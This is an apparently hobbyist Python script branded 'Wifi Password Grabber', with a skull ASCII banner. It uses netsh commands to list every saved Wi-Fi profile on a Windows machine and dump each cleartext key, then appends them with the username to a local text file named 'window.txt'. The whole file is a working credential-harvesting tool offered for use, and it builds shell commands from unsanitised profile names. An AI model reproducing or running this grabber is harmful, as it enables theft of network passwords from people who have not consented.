from time import time
from os import environ, popen, system
start_time = time()
username = environ.get('USERNAME')

data = popen("netsh wlan show profiles").read().split('\n')
profiles = [i.split(': ')[1].replace("\r", '') for i in data if "All User Profile" in i]
passwords = []
for i in profiles:
    result = (popen("netsh wlan show profile " + i + " key=clear").read().split("\n"))
    password = ([i.split(": ")[1].replace('\r', "") for i in result if "Key Content" in i])
    if password:
        passwords.append(password[0])
    else:
        passwords.append("")
end = (list(zip(profiles, passwords)))
wifi = []
for i in end:
    wifi.append("{:<20}|  {}".format(i[0], i[1]))
wifi = '\n'.join(wifi)
if not wifi:
    wifi = "Not Any Wireless Network Found. Ha ha ha!"
end = """----------------------------------------
Wifi Password Grabber CREATED BY SHAIL
USERNAME :: {}
{}
----------------------------------------
DONE
----------------------------------------
""".format(username, wifi)
with open("window.txt", 'a') as f:
    f.write(end)
end_time = time()
system("color 0a")
shail = r"""
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
"""
print(shail)
shail = """
   _____                _           _   ____           _____ _           _ _ 
  / ____|              | |         | | |  _ \         / ____| |         (_) |
 | |     _ __ ___  __ _| |_ ___  __| | | |_) |_   _  | (___ | |__   __ _ _| |
 | |    | '__/ _ \/ _` | __/ _ \/ _` | |  _ <| | | |  \___ \| '_ \ / _` | | |
 | |____| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |  ____) | | | | (_| | | |
  \_____|_|  \___|\__,_|\__\___|\__,_| |____/ \__, | |_____/|_| |_|\__,_|_|_|
                                               __/ |                         
                                              |___/                          
"""
print(shail)
print("DONE\nExecution Time " + str(round(end_time - start_time, 3)) + " seconds")
raw_input("Press Enter to close ...  ")
